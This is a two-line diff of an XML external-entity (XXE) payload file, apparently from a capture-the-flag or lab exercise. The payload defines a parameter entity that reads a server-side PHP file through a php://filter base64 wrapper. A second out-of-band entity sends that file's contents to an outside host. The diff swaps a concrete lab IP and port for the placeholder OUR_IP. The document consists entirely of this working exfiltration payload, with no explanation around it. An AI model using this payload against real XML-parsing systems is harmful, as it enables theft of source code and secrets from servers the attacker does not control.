@@ -1,2 +1,2 @@
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
-<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.145:4444/index.php?content=%file;'>">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP/index.php?content=%file;'>">
